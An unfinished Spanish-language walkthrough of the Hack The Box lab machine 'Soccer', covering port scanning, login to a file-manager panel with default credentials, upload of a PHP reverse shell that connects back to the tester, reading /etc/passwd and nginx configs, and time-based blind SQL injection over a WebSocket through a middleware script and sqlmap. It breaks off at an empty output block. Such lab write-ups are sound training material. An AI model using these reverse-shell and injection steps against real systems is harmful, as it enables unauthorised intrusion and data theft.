---
title: Soccer HTB
date: 2023-02-20
---
#linux #nginx 

SIN TERMINAR

## Reconocimiento

Comenzaremos comprobando que la máquina se encuentra activa con `ping`, y en base al ttl, podemos sospechar que se trata de una máquina **linux**. A continuación lanzamos [[nmap]] en busca de puertos abiertos:

```bash
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn <ip>
```
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
```

Vemos que tenemos un *ssh*, una página *http* y otro servicio llamado *xmltec-xmlmail*.

Volvemos a lanzar nmap en busca de más información y las versiones de cada servicio:

```bash
sudo nmap -sCV -p 22,80,9091 -n -Pn <ip>
```
```bash
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
```

Vemos que se trata de una máquina Ubuntu, sin embargo nmap no consigue sacar información sobre el servicio del puerto 9091.

Tratamos ahora de acceder a la página, después de añadir el dominio al `/etc/hosts`. Pero vemos que se trata de un simple blog. Así que podríamos pasar a buscar posibles archivos y directorios con [[gobuster]] ([[Directories and files enumeration]]):

```bash
gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/common.txt
```
```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/20 10:40:23 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 20469 / 20470 (100.00%)
===============================================================
2023/02/20 10:49:29 Finished
===============================================================
```

Vemos que tiene un directorio `/tiny/`, así que tratamos de acceder. Una vez dentro vemos una pestaña de login. Con una búsqueda rápida en internet encontramos que las credenciales por defecto para el servicio son `admin:admin@123`, y resultan ser válidas, dándonos acceso a un panel de administración.


## Explotación

En este punto, podríamos tratar de subir una reverse shell al servidor para tratar de conectarnos. Con [[wappalizer]] vemos que la página utiliza php como lenguaje. Así que subiremos una reverse shell en ***php*** ([[Reverse shell]]), en concreto esta de [aquí](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Y cambiamos la ip y el puerto, en mi caso usaré el 443:

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 443;       // CHANGE THIS
```

Nos ponemos en escucha con [[netcat]]:

```bash
nc -lvnp 443
```

Y la subimos y accedemos a la ruta `http://soccer.htb/tiny/uploads/reverse_shell.php`.

```bash
listening on [any] 443 ...
connect to [10.10.16.46] from (UNKNOWN) [10.10.11.194] 44028
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 22:37:49 up  3:01,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```


## Escalada de privilegios

Si comprobamos que usuario somos con `whoami` vemos que somos `www-data`, y con `groups` vemos que únicamente pertenecemos al grupo `www-data`.

Antes de comenzar a elevar privilegios aplicaremos un [[Tratamiento de la tty]].

Una vez con una shell completamente interactiva podemos echar un vistazo al `/etc/passwd` para tratar de encontrar usuarios potenciales. Para nuestra suerte tenemos privilegios para listarlo:

```bash
bash-5.0$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
player:x:1001:1001::/home/player:/bin/bash
```

Con `grep bash` podemos buscar los usuarios potenciales, entre los que vemos a `root` y a `player`.

Como recordamos que el servidor se trataba de un [[nginx]], cpodemos tratar de listar el `/etc/nginx/sites-enabled` en busca de posibles subdominios:

```bash
bash-5.0$ cd /etc/nginx/sites-enabled
bash-5.0$ ls
default  soc-player.htb
```

Tratamos ahora de acceder al subdominio, añadiéndolo en el `/etc/hosts` (`sudo echo '<ip> soc-player.soccer.htb' >> /etc/hosts`) y accediendo por el navegador. La página parece igual que la que ya habíamos visto, pero ahora hay una pestaña de registro y de login.

Intentemos registrarnos y loguearnos.

En el código fuente de la página que nos sale una vez dentro (*CTL+U*), podemos ver:

```js
<script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        [...]
	    function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
        }
	    [...]
```

Además tenemos asignado un *número de ticket* y hay un buscador que aparentemente sólo dice si el ticket existe. En este punto podríamos buscar una posible vuln de [[Sql injection]]. Si probamos con nuestro número nos dice que *Ticket Exists*, en cambio con cualquier otro nos dice que *Ticket Doesn't Exist*. Pero si probamos con `<numero que no exista> OR 1`, entonces si existe, por tanto de ducimos que **existe una vulnarebilidad de sql injection**.

Como no podemos lanzar [[sqlmap]] directamente ya que la petición va a través de sockets, hacemos una búsqueda por internet sobre cómo realizar un SQLi a través de websockets. Lo que nos lleva al siguiente [artículo](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) con un script muy interesante en *python3*. 

El script hará las veces de transcriptor, poniéndose entre el servidor y sqlmap. Primero debemos cambiar `ws_server` y `data`:

```python
ws_server = "ws://soc-player.soccer.htb:9091"
```
```python
data = '{"id":"%s"}' % message
```

Y arrancamos el script:

```bash
sudo python3 script.py
[+] Starting MiddleWare Server
[+] Send payloads in http://localhost:8081/?id=*
```

Después lanzamos sqlmap:

```bash
sudo sqlmap -u 'http://localhost:8081/?id=1' -p 'id'
```

Podemos ver que lanzamos sqlmap para que acceda mediante el script.

Obtenemos:

```bash
[01:14:17] [INFO] resuming back-end DBMS 'mysql' 
[01:14:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1046 FROM (SELECT(SLEEP(5)))maQi)
---
[01:14:48] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[01:14:48] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'
```

Así que volvemos a lanzar sqlmap:

```bash
sudo sqlmap -u 'http://localhost:8081/?id=' --current-db
```
```bash

```